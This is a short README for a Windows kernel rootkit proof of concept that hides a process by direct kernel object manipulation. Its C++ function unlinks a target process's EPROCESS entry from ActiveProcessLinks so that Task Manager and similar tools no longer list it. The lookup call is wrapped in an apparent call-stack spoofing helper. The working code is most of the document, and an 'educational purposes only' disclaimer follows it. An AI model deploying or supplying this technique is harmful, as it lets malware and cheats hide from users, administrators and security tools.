# DKOM-Process-Unlinker
**POC for Kernel-Level Process Hiding via Direct Kernel Object Manipulation (DKOM)**

This project demonstrates a minimalistic Proof of Concept (POC) for hiding a process in Windows kernel mode by directly manipulating kernel objects **(DKOM - Direct Kernel Object Manipulation)**.
It unlinks a target process's **EPROCESS** structure from the ActiveProcessLinks list, making the process invisible to standard process enumeration tools like Task Manager.

---

```cpp
// Hides a process from the active process linked list in the kernel
NTSTATUS HideProcess(int processId)
{
    PEPROCESS targetProcess = nullptr;

    // Look up the process object by its PID
    NTSTATUS status = ace_spoof(PsLookupProcessByProcessId)((HANDLE)processId, &targetProcess);
    if (!NT_SUCCESS(status) || !targetProcess)
    {
        return STATUS_UNSUCCESSFUL;
    }

    // Get the ActiveProcessLinks entry from the EPROCESS structure
    LIST_ENTRY* activeProcessLinks = (LIST_ENTRY*)((CHAR*)targetProcess + 0x448);

    // Unlink the process from the active process list
    LIST_ENTRY* prevEntry = activeProcessLinks->Blink;
    LIST_ENTRY* nextEntry = activeProcessLinks->Flink;

    prevEntry->Flink = nextEntry;
    nextEntry->Blink = prevEntry;

    return STATUS_SUCCESS;
}```

---

## Disclaimer

This project is for **educational and research purposes only**.  
I do **not** condone or support malicious use of this information.  
Use responsibly, in controlled environments, and at your own risk.

---
